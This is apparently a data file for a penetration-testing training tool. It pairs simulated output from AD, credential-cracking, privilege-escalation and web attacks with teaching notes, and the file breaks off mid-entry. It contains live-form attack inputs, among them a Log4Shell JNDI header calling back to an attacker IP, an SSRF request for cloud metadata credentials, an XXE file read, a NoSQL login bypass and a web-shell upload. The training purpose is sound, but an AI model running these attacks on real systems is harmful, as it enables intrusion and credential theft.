    'eternalblue': {
      output: [
        'Host script results:',
        '| smb-vuln-ms17-010:',
        '|   VULNERABLE: Remote Code Execution vulnerability in SMBv1 (ms17-010)',
        '|_    State: VULNERABLE',
      ].join('\n'),
      signal: '|_    State: VULNERABLE',
      teach: 'MS17-010 (EternalBlue) is unauthenticated SMBv1 remote code execution as SYSTEM. If the scan says VULNERABLE, it is often the whole box in one shot — but confirm the target is a real lab host, not a honeypot, before you fire.',
    },
    'gpp-passwords': {
      output: [
        'Groups.xml:',
        '  <Properties userName="svc_admin"',
        '    cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"/>',
        '$ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ',
        'Password123',
      ].join('\n'),
      signal: 'Password123',
      teach: 'Group Policy Preferences stored passwords in SYSVOL encrypted with a key Microsoft published. Any domain user can read `Groups.xml` and decrypt the `cpassword` — a free set of working credentials.',
    },
    'lateral-exec': {
      output: [
        'SMB    10.10.10.20   445  WEB01   [+] CORP\\svc_admin:Password123 (Pwn3d!)',
        'SMB    10.10.10.20   445  WEB01   [+] Executed command via wmiexec',
        'SMB    10.10.10.20   445  WEB01   nt authority\\system',
      ].join('\n'),
      signal: 'SMB    10.10.10.20   445  WEB01   [+] CORP\\svc_admin:Password123 (Pwn3d!)',
      teach: 'Once a credential is local admin somewhere, "Pwn3d!" marks every host it owns. Spraying the cred across the subnet maps your lateral movement — each Pwn3d! box is a new shell and new loot.',
    },
    'trust-enum': {
      output: [
        'List of domain trusts:',
        '    0: CORP corp.local (NT 5) (Forest Tree Root) (Primary Domain)',
        '    1: DEV dev.corp.local (NT 5) (Direct Outbound)',
        'The command completed successfully',
      ].join('\n'),
      signal: '1: DEV dev.corp.local (NT 5) (Direct Outbound)',
      teach: 'Domains rarely stand alone. A trust to `dev.corp.local` means credentials or tickets from one domain may reach the other — the path to the goal sometimes runs through a trusted domain, not the one you landed in.',
    },

    // ==================== CREDENTIALS & CRACKING ====================
    'responder-poison': {
      output: [
        '[*] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name fileshare',
        '[SMB] NTLMv2-SSP Client   : 10.10.10.50',
        '[SMB] NTLMv2-SSP Username : CORP\\jdoe',
        '[SMB] NTLMv2-SSP Hash     : jdoe::CORP:1122...:A1B2...',
      ].join('\n'),
      signal: '[SMB] NTLMv2-SSP Username : CORP\\jdoe',
      teach: 'When a Windows host mistypes a share name, it broadcasts asking "who is fileshare?". Responder answers "me", and the victim sends its NetNTLMv2 hash. You now have a hash to crack or relay — no exploit, just a protocol default.',
    },
    'crack-kerberoast': {
      output: [
        '$krb5tgs$23$*svc_sql$CORP.LOCAL$...:3f2a... : Summer2024!',
        'Session..........: hashcat',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoast ticket (mode 13100) is encrypted with the service account\'s password hash, so you can crack it offline at full speed. "Cracked" means you now hold that account\'s cleartext password.',
    },
    'crack-netntlmv2': {
      output: [
        'JDOE::CORP:1122334455667788:A1B2...:0101... : Winter2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'JDOE::CORP:1122334455667788:A1B2...:0101... : Winter2024!',
      teach: 'The NetNTLMv2 hash Responder captured cracks offline in hashcat mode 5600. Recover the password and the captured hash becomes a real login you can use anywhere that account is valid.',
    },
    'online-brute-ssh': {
      output: [
        '[DATA] attacking ssh://10.10.10.10:22/',
        '[22][ssh] host: 10.10.10.10   login: bob   password: iloveyou',
        '1 of 1 target successfully completed, 1 valid password found',
      ].join('\n'),
      signal: '[22][ssh] host: 10.10.10.10   login: bob   password: iloveyou',
      teach: 'When you have a real username but no password, an online brute against SSH can find a weak one. Keep the wordlist small and the rate sane — lab accounts lock out too, and a found pair is an instant shell.',
    },

    // ==================== DATABASES ====================
    'mysql-login': {
      output: [
        '+-------------------------+',
        '| version()               |',
        '+-------------------------+',
        '| 5.7.33-0ubuntu0.16.04.1 |',
        '+-------------------------+',
      ].join('\n'),
      signal: '| 5.7.33-0ubuntu0.16.04.1 |',
      teach: 'A successful MySQL login is a foothold of its own: from the SQL prompt you can read application secrets, write files to the web root with INTO OUTFILE, and sometimes reach the OS. Confirm the version first — it steers what is possible.',
    },
    'mssql-xp-cmdshell': {
      output: [
        'SQL> EXEC xp_cmdshell \'whoami\'',
        'output',
        '--------------------------------',
        'nt service\\mssqlserver',
      ].join('\n'),
      signal: 'nt service\\mssqlserver',
      teach: 'With sysadmin on MSSQL you can re-enable `xp_cmdshell` and run OS commands as the SQL service account. The `whoami` output confirms code execution — the database just became a shell.',
    },
    'postgres-login': {
      output: [
        ' version',
        '--------------------------------------------',
        ' PostgreSQL 13.3 on x86_64-pc-linux-gnu',
        '(1 row)',
      ].join('\n'),
      signal: ' PostgreSQL 13.3 on x86_64-pc-linux-gnu',
      teach: 'A PostgreSQL session with the right role can read files and, via COPY ... FROM PROGRAM, run commands. As with any DB foothold, the version tells you which of those paths is open to you.',
    },

    // ==================== SHELLS & TRANSFER ====================
    'shell-revshell-linux': {
      output: [
        'listening on [any] 4444 ...',
        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
        'bash: cannot set terminal process group: Inappropriate ioctl for device',
        'www-data@target:/var/www/html$ id',
        'uid=33(www-data) gid=33(www-data)',
      ].join('\n'),
      signal: 'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10] 54312',
      teach: 'The "connect to … from" line is your listener catching the target calling back — the moment code execution becomes an interactive shell. Note the raw prompt; it is not a proper TTY yet, which is why the next move is to upgrade it.',
    },
    'shell-pty-upgrade': {
      output: [
        'www-data@target:/$ python3 -c \'import pty;pty.spawn("/bin/bash")\'',
        'www-data@target:/$ ^Z',
        '[1]+  Stopped',
        '$ stty raw -echo; fg',
        'www-data@target:/$',
      ].join('\n'),
      signal: '$ stty raw -echo; fg',
      teach: 'A raw netcat shell has no job control, no arrows, no tab-complete, and dies on Ctrl-C. Spawning a PTY and fixing the terminal with `stty raw -echo` gives you a real shell — do it before you try anything that needs interaction, like `su` or `ssh`.',
    },

    // ==================== LINUX PRIVESC ====================
    'capabilities': {
      output: [
        '/usr/bin/python3.8 = cap_setuid+ep',
        '/usr/bin/ping = cap_net_raw+ep',
      ].join('\n'),
      signal: '/usr/bin/python3.8 = cap_setuid+ep',
      teach: 'File capabilities grant slices of root power without the SUID bit. `cap_setuid+ep` on python means python can set its UID to 0 — one line (`os.setuid(0)`) and you are root. Always run `getcap -r /` on a Linux box.',
    },
    'docker-socket': {
      output: [
        'srw-rw---- 1 root docker 0 Jan  1 10:00 /var/run/docker.sock',
        'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
      ].join('\n'),
      signal: 'groups=1000(dev),998(docker)',
      teach: 'Membership in the `docker` group is root-equivalent: you can start a container that mounts the host\'s `/` and read or write anything as root. The docker socket being reachable is the whole game.',
    },
    'writable-passwd': {
      output: [
        '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      ].join('\n'),
      signal: '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      teach: 'A world-writable `/etc/passwd` lets you add a root-UID user with a password hash you control (openssl passwd), then `su` to it. A single misconfigured permission bit is a direct path to root.',
    },

    // ==================== WINDOWS PRIVESC ====================
    'stored-credentials': {
      output: [
        'Currently stored credentials:',
        '    Target: Domain:interactive=CORP\\administrator',
        '    Type: Domain Password',
      ].join('\n'),
      signal: '    Target: Domain:interactive=CORP\\administrator',
      teach: 'Windows caches credentials for convenience. `cmdkey /list` shows stored logins you can reuse with `runas /savecred` — sometimes an Administrator credential is sitting there for the taking, no cracking needed.',
    },
    'wesng-patch-gaps': {
      output: [
        '[+] OS: Windows Server 2016 1607 (10.0.14393)',
        '[+] Missing: MS16-135 (CVE-2016-7255) — Win32k elevation of privilege',
        '[+] Missing: CVE-2021-34527 (PrintNightmare)',
      ].join('\n'),
      signal: '[+] Missing: CVE-2021-34527 (PrintNightmare)',
      teach: 'Feeding `systeminfo` to a patch-gap checker lists the kernel exploits the box is missing. Treat each as a candidate — confirm the build and architecture before running one, since a wrong kernel exploit can bluescreen the target.',
    },

    // ==================== PIVOTING ====================
    'local-linux-interfaces': {
      output: [
        'eth0: 10.10.10.10/24',
        'eth1: 172.16.5.10/24',
      ].join('\n'),
      signal: 'eth1: 172.16.5.10/24',
      teach: 'A compromised host with a second NIC is a doorway. `eth1` on 172.16.5.0/24 is a network you could not reach before — the reason to pivot. Map the host\'s interfaces first; they tell you what is now in range.',
    },
    'pivot-chisel-socks': {
      output: [
        'server: Reverse tunnelling enabled',
        'server: Listening on http://0.0.0.0:8080',
        'client: Connected to http://10.10.14.5:8080',
        'client: tun: proxy#R:127.0.0.1:1080=>socks',
      ].join('\n'),
      signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
      teach: 'Chisel builds a SOCKS proxy back through the compromised host. Point proxychains at 127.0.0.1:1080 and your tools reach the internal network as if you were on it — the standard way to scan and attack a subnet you can only touch through one box.',
    },

    // ==================== ACTIVE DIRECTORY (depth) ====================
    'nxc-arsenal': {
      output: [
        'SMB  10.10.10.10  445  DC01  [+] corp.local\\jdoe:Summer2024!',
        'SMB  10.10.10.10  445  DC01  [*] Enumerated shares',
        'SMB  10.10.10.10  445  DC01  Share       Permissions  Remark',
        'SMB  10.10.10.10  445  DC01  SYSVOL      READ',
        'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  Finance     READ,WRITE',
      teach: 'NetExec (nxc) is the swiss-army knife of AD: one credential, and it enumerates shares, users, password policy, and sessions, then runs modules. A WRITE share is a place to drop a payload or capture a hash — note it and move on.',
    },
    'ticket-reuse': {
      output: [
        '[*] Action: Import Ticket',
        '[+] Ticket successfully imported!',
        'C:\\> klist',
        '   Client: jdoe @ CORP.LOCAL',
        '   Server: krbtgt/CORP.LOCAL',
      ].join('\n'),
      signal: '[+] Ticket successfully imported!',
      teach: 'Pass-the-Ticket loads a stolen Kerberos ticket straight into your session — no password needed. Once "imported", every tool that speaks Kerberos acts as that user. A TGT is the whole identity; a TGS is one service.',
    },
    'powerview-enum': {
      output: [
        'PS> Get-DomainUser -SPN | select samaccountname',
        'samaccountname',
        '--------------',
        'svc_sql',
        'svc_web',
        'PS> Find-InterestingDomainAcl -ResolveGUIDs',
        'IdentityReferenceName : jdoe   ActiveDirectoryRights : GenericAll',
      ].join('\n'),
      signal: 'IdentityReferenceName : jdoe   ActiveDirectoryRights : GenericAll',
      teach: 'PowerView turns a Windows foothold into a map of the domain. Accounts with an SPN are kerberoastable; a GenericAll ACL over an object is a takeover edge. This is BloodHound\'s data, gathered by hand.',
    },
    'ad-psdotnet-enum': {
      output: [
        'PS> ([ADSISearcher]"(samAccountType=805306368)").FindAll().Count',
        '42',
        'PS> ([ADSISearcher]"(&(objectCategory=user)(servicePrincipalName=*))")',
        'svc_sql  CN=svc_sql,OU=Services,DC=corp,DC=local',
      ].join('\n'),
      signal: 'svc_sql  CN=svc_sql,OU=Services,DC=corp,DC=local',
      teach: 'When PowerView is blocked, raw .NET ADSI queries enumerate the domain with nothing but built-in PowerShell — no upload, no download. Living off the land this way sidesteps the AV that flags known tooling.',
    },
    'ad-legacy-enum': {
      output: [
        'C:\\> net user /domain',
        'User accounts for \\\\DC01',
        'Administrator   jdoe   krbtgt   svc_sql',
        'C:\\> net group "Domain Admins" /domain',
        'Members: Administrator  backupadmin',
      ].join('\n'),
      signal: 'Members: Administrator  backupadmin',
      teach: 'Every Windows box ships with `net` and `nltest`. They are noisy but always present — when you land on a host with no tools, these built-ins still list users, groups, and domain admins. `backupadmin` in Domain Admins is a lead.',
    },
    'kerberos-tickets': {
      output: [
        '$ nxc ldap 10.10.10.10 -u jdoe -p Summer2024!',
        'LDAP  10.10.10.10  389  DC01  [-] KRB_AP_ERR_SKEW (clock skew too great)',
        '$ sudo ntpdate -u 10.10.10.10',
        '$ nxc ldap 10.10.10.10 -u jdoe -p Summer2024!',
        'LDAP  10.10.10.10  389  DC01  [+] corp.local\\jdoe:Summer2024!',
      ].join('\n'),
      signal: 'KRB_AP_ERR_SKEW (clock skew too great)',
      teach: 'Kerberos refuses tickets when your clock differs from the DC by more than 5 minutes — "KRB_AP_ERR_SKEW". It is the single most common reason an AD attack "mysteriously" fails. Sync your clock to the DC and try again.',
    },
    'crack-tgs': {
      output: [
        '$krb5tgs$23$*svc_sql$CORP.LOCAL$...:9f8c... : P@ssw0rd2023',
        'Session..........: hashcat',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoasted service ticket (mode 13100) cracks offline — the DC never sees your guesses, so you crack at full GPU speed with no lockout. Service accounts often have weak, rarely-rotated passwords, which is why this works so often.',
    },
    'laps-read': {
      output: [
        'LDAP  10.10.10.20  389  WS01  [+] ms-Mcs-AdmPwd read',
        'LDAP  10.10.10.20  389  WS01  Computer:WS01$  Password:Hb7!xQ2m...k9',
      ].join('\n'),
      signal: 'Computer:WS01$  Password:Hb7!xQ2m...k9',
      teach: 'LAPS randomises the local Administrator password per machine — good security, unless your account has the right to read the `ms-Mcs-AdmPwd` attribute. If you can read it, you have local admin on that host, handed over in cleartext.',
    },
    'gmsa-read': {
      output: [
        'ReadGMSAPassword via corp.local\\svc_app$',
        '[*] Managed Password: aad3b435...:5f4dcc3b5aa765d61d8327deb882cf99',
        '[*] NTLM            : 5f4dcc3b5aa765d61d8327deb882cf99',
      ].join('\n'),
      signal: '[*] NTLM            : 5f4dcc3b5aa765d61d8327deb882cf99',
      teach: 'A gMSA\'s password is managed by AD and readable only by principals on its allow-list. When your account is on that list, you recover the NT hash directly — no cracking — and can pass it. gMSAs are often over-privileged service identities.',
    },
    'bloodyad-acl': {
      output: [
        '[+] jdoe has GenericAll over svc_backup',
        '$ bloodyAD ... set password svc_backup NewP@ss123!',
        '[+] Password changed successfully for svc_backup',
      ].join('\n'),
      signal: '[+] Password changed successfully for svc_backup',
      teach: 'An ACL edge like GenericAll is abstract until you use it. bloodyAD turns "I have rights over this account" into "I just set its password" — a concrete takeover. Each edge BloodHound draws is an action like this one.',
    },
    'shadow-credentials': {
      output: [
        '[*] Adding Key Credential to msDS-KeyCredentialLink of svc_app',
        '[+] Saved PFX to svc_app.pfx',
        '$ certipy auth -pfx svc_app.pfx',
        '[*] Got hash for svc_app: aad3b...:2b576acbe6b...',
      ].join('\n'),
      signal: '[*] Got hash for svc_app: aad3b...:2b576acbe6b...',
      teach: 'Shadow Credentials abuses write access to an account\'s msDS-KeyCredentialLink: you add your own certificate, then authenticate as the account via PKINIT and recover its NT hash. A modern, quiet alternative to resetting the password.',
    },
    'adcs-esc': {
      output: [
        'Certificate Templates',
        '  0',
        '    Template Name    : UserEnroll',
        '    Enrollment Rights: Domain Users',
        '    [!] Vulnerabilities: ESC1 — Enrollee supplies subject + client auth',
      ].join('\n'),
      signal: '[!] Vulnerabilities: ESC1 — Enrollee supplies subject + client auth',
      teach: 'A misconfigured certificate template (ESC1) lets any user request a cert as anyone — including a Domain Admin. certipy finds the template; the "Vulnerabilities" line is your path. AD CS is a frequent, high-impact domain-takeover route.',
    },
    'cert-authenticate': {
      output: [
        '[*] Using principal: administrator@corp.local',
        '[*] Trying to get TGT...',
        '[+] Got hash for administrator@corp.local: aad3b...:31d6cfe0d16...',
      ].join('\n'),
      signal: '[+] Got hash for administrator@corp.local: aad3b...:31d6cfe0d16...',
      teach: 'A certificate you obtained (via ESC1, Shadow Credentials, etc.) authenticates over PKINIT and hands back the account\'s NT hash. From there you pass-the-hash — the certificate was just the key that unlocked the credential.',
    },
    'getst-impersonation': {
      output: [
        '[*] Impersonating administrator',
        '[*] Requesting S4U2self',
        '[*] Requesting S4U2proxy',
        '[+] Saving ticket in administrator@cifs_dc01.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator@cifs_dc01.ccache',
      teach: 'With constrained-delegation rights you ask the KDC for a service ticket "on behalf of" any user — S4U2self then S4U2proxy — and get a ccache that lets you act as Administrator against that service. Load the ticket and you are in.',
    },
    'coerce-auth': {
      output: [
        '[*] Sending PetitPotam (EfsRpcOpenFileRaw) to 10.10.10.10',
        '[+] Attack worked — target authenticated to 10.10.14.5',
        '[SMB] NTLMv2-SSP Username : CORP\\DC01$',
      ].join('\n'),
      signal: '[SMB] NTLMv2-SSP Username : CORP\\DC01$',
      teach: 'Coercion tricks a target — often a DC — into authenticating to you (PetitPotam, PrinterBug). The machine account hash you catch (`DC01$`) can be relayed to AD CS or LDAP for escalation. The DC authenticating to you is the whole point.',
    },
    'unconstrained-delegation': {
      output: [
        '[*] Monitoring for new TGTs every 5 seconds',
        '[+] Found new TGT: user=DC01$@CORP.LOCAL',
        '[*] Base64(ticket.kirbi): doIF...',
      ].join('\n'),
      signal: '[+] Found new TGT: user=DC01$@CORP.LOCAL',
      teach: 'A host with unconstrained delegation caches the TGT of everyone who authenticates to it. Combine it with coercion to make a DC connect, capture `DC01$`\'s TGT, and you can DCSync. Watching for the DC\'s ticket is the goal.',
    },
    'golden-ticket': {
      output: [
        '[*] Creating golden ticket for administrator',
        '[*] Using domain SID S-1-5-21-...-...-...',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'With the krbtgt hash you forge a TGT for any user, valid until krbtgt is rotated twice — the ultimate persistence. This is a post-compromise move: you already own the domain, and the golden ticket keeps you in.',
    },
    'silver-ticket': {
      output: [
        '[*] Creating silver ticket for CIFS/dc01.corp.local',
        '[*] Using service account hash (RC4)',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'A silver ticket forges a service ticket using one service account\'s hash — scoped to that one service, but it never touches the DC, so it is quiet. Narrower than a golden ticket, and useful when all you have is a single service hash.',
    },

    // ==================== WEB (depth) ====================
    'svn-exposed': {
      output: [
        '$ curl -s http://10.10.10.10/.svn/entries',
        '10',
        'dir',
        'https://svn.corp.local/app',
        'config.php',
        'db_connect.php',
      ].join('\n'),
      signal: 'db_connect.php',
      teach: 'An exposed `.svn/` directory leaks the source tree the same way `.git/` does. Reconstruct the files — `db_connect.php` likely holds database credentials. Version-control leftovers are a goldmine; always check for them.',
    },
    'ssrf': {
      output: [
        '$ curl \'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\'',
        's3-readonly-role',
        '$ curl \'http://10.10.10.10/fetch?url=http://169.254.169.254/.../s3-readonly-role\'',
        '"AccessKeyId": "AKIA...", "SecretAccessKey": "wJal..."',
      ].join('\n'),
      signal: '"AccessKeyId": "AKIA...", "SecretAccessKey": "wJal..."',
      teach: 'Server-Side Request Forgery makes the server fetch a URL you choose. Pointed at a cloud metadata endpoint (169.254.169.254), it leaks IAM credentials; pointed inside, it reaches services the firewall hides. The server is your proxy into places you cannot reach.',
    },
    'xxe': {
      output: [
        '$ curl -s -X POST http://10.10.10.10/api -d @payload.xml',
        '<?xml ... <!ENTITY xxe SYSTEM "file:///etc/passwd">',
        'root:x:0:0:root:/root:/bin/bash',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
      ].join('\n'),
      signal: 'root:x:0:0:root:/root:/bin/bash',
      teach: 'XML External Entity injection abuses an XML parser that resolves external entities. Declare one pointing at `file:///etc/passwd` and the response echoes the file back. Any endpoint that accepts XML is worth testing for it.',
    },
    'deserialization': {
      output: [
        '$ ysoserial CommonsCollections5 \'...\' | base64',
        '$ # listener receives the callback:',
        'connect to [10.10.14.5] from (UNKNOWN) [10.10.10.10]',
        'uid=0(root) gid=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root)',
      teach: 'When an app deserialises attacker-controlled data, a crafted object (ysoserial builds them) runs code as it is rebuilt. The callback as root is code execution. Look for serialised blobs in cookies, parameters, and APIs.',
    },
    'jwt-attacks': {
      output: [
        '$ echo $TOKEN | cut -d. -f2 | base64 -d',
        '{"user":"guest","role":"user","alg":"HS256"}',
        '$ # re-sign with alg:none or a cracked secret',
        '{"user":"admin","role":"admin"}',
      ].join('\n'),
      signal: '{"user":"admin","role":"admin"}',
      teach: 'A JSON Web Token is only as safe as its signature. If the server accepts `alg:none`, or the HMAC secret is weak enough to crack, you forge a token that says `admin`. Always decode the token first — the claims tell you what to tamper with.',
    },
    'nosql-injection': {
      output: [
        '$ curl -s -X POST http://10.10.10.10/login -d \'user[$ne]=x&pass[$ne]=x\'',
        'HTTP/1.1 302 Found',
        'Location: /dashboard',
        'Set-Cookie: session=loggedin-as-admin',
      ].join('\n'),
      signal: 'Set-Cookie: session=loggedin-as-admin',
      teach: 'NoSQL backends like MongoDB take query operators as input. `{"$ne":"x"}` means "not equal to x" — always true — so the login matches the first user and you are in without a password. Test JSON and array params against NoSQL apps.',
    },
    'jenkins-access': {
      output: [
        '$ curl -s http://10.10.10.10:8080/script',
        '# Groovy console reachable (authenticated or anonymous)',
        'println "whoami".execute().text',
        'nt authority\\system',
      ].join('\n'),
      signal: 'nt authority\\system',
      teach: 'Jenkins\' Script Console runs arbitrary Groovy as the Jenkins service — often SYSTEM or a build account. If `/script` is reachable, it is remote code execution by design. CI servers are high-value: they hold credentials and run as privileged accounts.',
    },
    'verb-tampering': {
      output: [
        '$ curl -s -X OPTIONS -i http://10.10.10.10/admin/',
        'HTTP/1.1 200 OK',
        'Allow: GET, POST, PUT',
        '$ curl -s -X PUT http://10.10.10.10/admin/shell.jsp --data-binary @shell.jsp',
        'HTTP/1.1 201 Created',
      ].join('\n'),
      signal: 'HTTP/1.1 201 Created',
      teach: 'Access controls often guard GET/POST but forget other verbs. If PUT is allowed, you can upload a web shell directly — "201 Created" means it landed. Enumerate the allowed methods before assuming a path is locked down.',
    },
    'xss-basics': {
      output: [
        '$ curl -s \'http://10.10.10.10/search.php?q=<b>xssprobe123</b>\'',
        '<p>No results for <b>xssprobe123</b></p>',
      ].join('\n'),
      signal: '<p>No results for <b>xssprobe123</b></p>',
      teach: 'Your `<b>` tag came back rendered, not escaped — the page reflects input into HTML unsanitised. That is reflected XSS: it runs in a victim\'s browser, useful for stealing sessions. On OSCP it matters most where it can reach an admin.',
    },
    'check-log4shell': {
      output: [
        '$ curl http://10.10.10.10/ -H \'User-Agent: ${jndi:ldap://10.10.14.5/x}\'',
        '# listener on 10.10.14.5:389 receives:',
        'LDAP query from 10.10.10.10 for /x',
      ].join('\n'),
      signal: 'LDAP query from 10.10.10.10 for /x',
      teach: 'Log4Shell (CVE-2021-44228) triggers when a vulnerable Log4j logs your `${jndi:ldap://...}` string and dutifully connects out to it. The inbound LDAP hit on your listener confirms the callback — the first step before staging a full exploit.',
    },
    'check-struts2': {
      output: [
        '$ curl -s \'http://10.10.10.10/\' -H "Content-Type: %{(#cmd=\'id\')...}"',
        'uid=0(root) gid=0(root) groups=0(root)',
      ].join('\n'),
      signal: 'uid=0(root) gid=0(root) groups=0(root)',
      teach: 'Apache Struts2 OGNL injection (e.g. CVE-2017-5638) evaluates attacker expressions in a header and runs commands — here as root. A dated Struts app is often a one-request shell; fingerprint the framework version first.',
    },

    // ==================== SERVICE & WEB CHECKS (depth) ====================
    'check-cors': {
      output: [
        '$ curl -sI -H "Origin: https://evil.example" http://10.10.10.10/api/me',
        'Access-Control-Allow-Origin: https://evil.example',
        'Access-Control-Allow-Credentials: true',
      ].join('\n'),
      signal: 'Access-Control-Allow-Origin: https://evil.example',
      teach: 'The server reflected your arbitrary Origin AND allows credentials — a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous combination.',
    },
    'check-http-redirect': {
      output: [
        '$ curl -sI http://10.10.10.10/',
        'HTTP/1.1 301 Moved Permanently',
        'Location: https://dev-internal.corp.local/',
      ].join('\n'),
      signal: 'Location: https://dev-internal.corp.local/',
      teach: 'A redirect can leak an internal hostname in its Location header — `dev-internal.corp.local` is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
    },
    'check-subdomain-takeover': {
      output: [
        '$ dig +noall +answer CNAME shop.corp.local',
        'shop.corp.local.  300  IN  CNAME  corp-shop.herokuapp.com.',
        '$ curl -s https://shop.corp.local/',
        'No such app — there is no app configured at that hostname',
      ].join('\n'),
      signal: 'No such app — there is no app configured at that hostname',
      teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. The "no such app" page is the tell.',
    },
    'check-dns-email': {
      output: [
        '$ dig +short TXT corp.local',
        '"v=spf1 include:_spf.google.com ~all"',
        '$ dig +short TXT _dmarc.corp.local',
        '"v=DMARC1; p=none"',
      ].join('\n'),
      signal: '"v=DMARC1; p=none"',
      teach: 'Email records tell you whether a domain can be spoofed. A soft SPF (`~all`) plus DMARC `p=none` means forged mail from this domain is unlikely to be rejected — a phishing lead in a real engagement, a reporting finding on the exam.',
    },
    'check-web-components': {
      output: [
        '$ curl -sI http://10.10.10.10/',
        'Server: Apache/2.4.49 (Unix)',
        'X-Powered-By: PHP/7.2.24',
        'Set-Cookie: PHPSESSID=...; path=/',
      ].join('\n'),
      signal: 'Server: Apache/2.4.49 (Unix)',
      teach: 'Response headers hand you the stack for free: web server, language, framework, sometimes exact versions. `Apache 2.4.49` and `PHP 7.2.24` are both searchable for known CVEs. Read the headers before you do anything clever.',
    },
    'check-cms-version': {
      output: [
        '$ curl -s http://10.10.10.10/CHANGELOG.txt | head -2',
        'Drupal 7.57, 2018-02-21',
        '$ # 7.57 predates Drupalgeddon2 (CVE-2018-7600)',
      ].join('\n'),
      signal: 'Drupal 7.57, 2018-02-21',
      teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2). Identify the CMS and its exact build, then look up what it is vulnerable to.',
    },
    'check-web-body': {
      output: [
        '$ curl -s http://10.10.10.10/ | grep -iE "comment|TODO|password"',
        '<!-- TODO: remove test login test/test before go-live -->',
      ].join('\n'),
      signal: '<!-- TODO: remove test login test/test before go-live -->',
      teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A `test/test` login left in a comment is a free set of working credentials — read the page humans never read.',
    },

    // ==================== CREDENTIALS & CRACKING (depth) ====================
    'crack-identify': {
      output: [
        '$ nth -f hashes.txt',
        '$krb5tgs$23$...',
        'Most likely: Kerberos 5 TGS-REP etype 23  hashcat: 13100',
      ].join('\n'),
      signal: 'Most likely: Kerberos 5 TGS-REP etype 23  hashcat: 13100',
      teach: 'Before you can crack a hash you must know what it is. name-that-hash reads the format and tells you the hashcat mode (here 13100). Guess the mode wrong and hashcat wastes hours on the wrong algorithm — identify first, always.',
    },
    'crack-asrep-offline': {
      output: [
        '$krb5asrep$23$jdoe@CORP.LOCAL:a1b2...:... : Welcome2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'An AS-REP hash (mode 18200) comes from an account with pre-auth disabled, and it cracks offline at full speed. "Cracked" means you now hold that user\'s real password — turn the roast into a login.',
    },
    'crack-shadow': {
      output: [
        'root:$6$xyz$...:::: : toor123',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A `$6$` hash from /etc/shadow is sha512crypt (mode 1800) — slow by design, so lean on a good wordlist and rules rather than brute force. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
    },
    'crack-archive': {
      output: [
        '$ zip2john backup.zip > backup.hash',
        '$ hashcat -m 17200 backup.hash rockyou.txt',
        'backup.zip:hunter2 ... : hunter2',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A password-protected archive you looted is just another crackable hash — `zip2john`/`office2john` extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
    },
    'crack-mscache2': {
      output: [
        '$DCC2$10240#jdoe#a1b2c3... : Autumn2023!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'Domain Cached Credentials (mscash2, mode 2100) are what a laptop stores so a domain user can log in offline. They crack slowly and cannot be passed — only cracked — but a recovered password is a real domain credential.',
    },
    'ntlm-relay-attack': {
      output: [
        '[*] Servers started, waiting for connections',
        '[*] Authenticating against smb://10.10.10.20 as CORP/JDOE SUCCEED',
        '[*] Target system bootkey: 0x...',
        '[*] Dumping local SAM hashes',
        'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
      ].join('\n'),
      signal: '[*] Authenticating against smb://10.10.10.20 as CORP/JDOE SUCCEED',
      teach: 'Relaying forwards a captured authentication to another host instead of cracking it — if SMB signing is off, the victim\'s auth logs you into a second machine as them. "SUCCEED" means you are in without ever knowing the password.',
    },
    'mitm6-ipv6-takeover': {
      output: [
        '[*] IPv6 address assigned to victim via rogue DHCPv6',
        '[*] Victim queried WPAD — serving malicious config',
        '[*] Got credentials relayed to LDAP: CORP\\jdoe',
      ].join('\n'),
      signal: '[*] Got credentials relayed to LDAP: CORP\\jdoe',
      teach: 'Windows prefers IPv6 and asks for a DHCPv6 server even when none is configured. mitm6 answers, becomes the victim\'s DNS, and relays the auth it captures. A default-on protocol you did not know was running becomes the way in.',
    },
    'online-brute-ftp': {
      output: [
        '[DATA] attacking ftp://10.10.10.10:21/',
        '[21][ftp] host: 10.10.10.10   login: anonymous   password:',
        '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
      ].join('\n'),
      signal: '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
